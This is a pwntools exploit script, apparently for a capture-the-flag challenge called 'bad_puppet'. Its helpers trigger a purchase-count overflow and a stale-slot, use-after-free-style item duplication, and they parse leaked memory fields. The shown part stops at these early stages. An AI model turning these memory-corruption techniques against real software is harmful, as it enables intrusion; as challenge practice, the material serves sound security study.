from pwn import *
import time, re, sys

class Game:
    """Drives bad_puppet. mode: 'socket' (default, faithful) or 'stdio'."""
    def __init__(self, mode="socket", env=None):
        context.log_level = "error"
        self.proc = None
        e = {"MALLOC_ARENA_MAX": "1"}
        if env: e.update(env)
        if mode == "socket":
            self.proc = process(["./bad_puppet"], cwd="/home/ubuntu/pwn/bp/bad_puppet", env=e)
            time.sleep(0.6)
            self.io = remote("127.0.0.1", 31337, timeout=10)
        else:
            self.io = process(["./bad_puppet", "--stdio"], cwd="/home/ubuntu/pwn/bp/bad_puppet", env=e)
        self.dead = False
        self.buf = b""
        time.sleep(0.4)
        self.drain(0.6)

    def _recv(self, t):
        try:
            return self.io.recv(65536, timeout=t)
        except EOFError:
            self.dead = True
            return b""
        except Exception:
            return b""

    def drain(self, t=0.15):
        end = time.time() + t
        out = b""
        while time.time() < end:
            d = self._recv(0.03)
            if d: out += d
        self.buf += out
        return out

    def cmd(self, s, t=0.15, echo=False):
        if isinstance(s, str): s = s.encode()
        try: self.io.sendline(s)
        except Exception:
            self.dead = True; return b""
        o = self.drain(t)
        if echo:
            sys.__stdout__.write("### %s\n%s\n" % (s.decode(errors="replace"), o.decode(errors="replace")))
            sys.__stdout__.flush()
        return o

    def raw(self, b, t=0.15):
        self.buf = b""
        try: self.io.send(b)
        except Exception:
            self.dead = True; return b""
        return self.drain(t)

    def text(self): return self.buf.decode(errors="replace")

    def inv(self):
        self.buf = b""
        self.cmd("inv list", 0.25)
        out = []
        for line in self.text().splitlines():
            m = re.match(r"\[\*\]   \[(\d+)\] #(\d+) (.*?) \| type=(\w[\w ]*?) \| (.*)$", line)
            if not m: continue
            out.append(dict(idx=int(m.group(1)), id=int(m.group(2)), name=m.group(3), type=m.group(4),
                            equipped=1 if "equipped=1" in m.group(5) else 0))
        return out

    def world(self):
        self.buf = b""
        self.cmd("mw show", 0.25)
        eqs, drops = [], []
        mode = None
        for line in self.text().splitlines():
            if line.startswith("[*] Equipped: empty"): mode = None; continue
            if line.startswith("[*] Drops: empty"): mode = None; continue
            if line.startswith("[*] Equipped:"): mode = "eq"; continue
            if line.startswith("[*] Drops:"): mode = "dp"; continue
            m = re.match(r"\[\*\]   \[(\d+)\] (.*)$", line)
            if not m or mode is None: continue
            idx = int(m.group(1)); body = m.group(2)
            if mode == "eq":
                mm = re.search(r"description_addr=(\w+) description_head=(\w+) description_key=(\w+)", body)
                eqs.append(dict(idx=idx, body=body,
                                addr=int(mm.group(1), 16) if mm else None,
                                head=int(mm.group(2), 16) if mm else None,
                                key=int(mm.group(3), 16) if mm else None))
            else:
                drops.append(dict(idx=idx, body=body, is_ring=("type=Ring" in body)))
        return eqs, drops

    # ---------------- stage 1 ----------------
    def game_setup(self):
        self.cmd("shop buy 3 4227858432", 0.45)
        self.cmd("map teleport castle", 0.3)
        self.cmd("battle", 0.3)
        self.cmd("use item", 0.3)
        self.cmd("1", 0.3)
        self.cmd("32", 0.45)
        self.cmd("mw pickup 0", 0.45)
        self.cmd("shop sell 1", 0.45)       # bomb stack -> 2.7e11 rupees
        self.cmd("shop buy 0 10", 0.7)
        self.cmd("shop buy 1 10", 0.7)

    # ---------------- stale-drop helper ----------------
    def stale_drop(self, slot, t=0.75):
        """drop item at slot and reverse inventory in one write -> slot becomes stale"""
        self.buf = b""
        self.raw(("inv drop %d\ninv sort\n" % slot).encode(), t)
        return "stale drop slot" in self.text()

    def find_drop_index(self, want_drop_ring, want_mirror_ring=None, mirror_is_x=None):
        """Return slot s so post-sort g_puppet[s] is the desired kind.
        v_pre[s] is dropped, v_pre[n-1-s] is used as the clone source."""
        for attempt in range(4):
            items = self.inv()
            n = len(items)
            for it in items:
                s = it["idx"]
                mir = n - 1 - s
                if mir < 0 or mir >= n: continue
                mirror = items[mir]
                if want_drop_ring and it["type"] != "Ring": continue
                if (not want_drop_ring) and it["type"] == "Ring": continue
                if mirror_is_x == "ring":
                    if mirror["type"] != "Ring": continue
                    if want_mirror_ring is not None and mirror["id"] != want_mirror_ring: continue
                elif mirror_is_x == "nonring":
                    if mirror["type"] == "Ring": continue
                return s
            self.cmd("inv sort", 0.3)
        return None

    def dup_ring(self):
        items = self.inv(); n = len(items)
        ringidx = {it["idx"] for it in items if it["type"] == "Ring"}
        cand = None
        for it in items:
            i = it["idx"]
            if it["type"] == "Ring": continue
            if (n - 1 - i) in ringidx: cand = i
        if cand is None: return None
        if not self.stale_drop(cand): return None
        eqs, drops = self.world()
        ridx = [d["idx"] for d in drops if d["is_ring"]]
        if not ridx: return None
        self.cmd("mw pickup %d" % ridx[0], 0.45)
        return cand
